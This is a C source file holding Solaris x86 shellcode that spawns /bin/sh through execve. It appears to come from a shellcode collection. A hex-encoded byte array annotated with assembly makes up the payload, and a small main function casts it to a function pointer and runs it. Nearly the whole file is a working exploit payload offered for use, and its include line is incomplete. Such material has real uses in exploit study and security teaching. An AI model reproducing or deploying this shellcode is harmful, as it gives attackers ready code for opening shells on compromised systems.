/*
 * Solaris shellcode - execve /bin/sh
 */

#include

// http://www.shellcode.com.ar
//
// execve(//bin/sh)

char shellcode[]=
   "\xb8\xff\xf8\xff\x3c"       // mov    eax, 03cfff8ffh
   "\xf7\xd0"                   // not    eax
   "\x50"                       // push   eax
   "\x31\xc0"                   // xor    eax, eax
   "\xb0\x9a"                   // mov    al, 09ah
   "\x50"                       // push   eax
   "\x89\xe5"                   // mov    ebp, esp
   "\x31\xc0"                   // xor    eax, eax
   "\x50"                       // push   eax
   "\x68\x2f\x2f\x73\x68"       // push   dword 68732f2fh
   "\x68\x2f\x62\x69\x6e"       // push   dword 6e69622fh
   "\x89\xe3"                   // mov    ebx, esp
   "\x50"                       // push   eax
   "\x53"                       // push   ebx
   "\x89\xe2"                   // mov    edx, esp
   "\x50"                       // push   eax
   "\x52"                       // push   edx
   "\x53"                       // push   ebx
   "\xb0\x3b"                   // mov    al, 59
   "\xff\xd5";                  // call   ebp

//

int
main(void)
{
    void (*code)() = (void *)shellcode;
    printf("Shellcode length: %d\n", strlen(shellcode));
    code();
    return(1);
}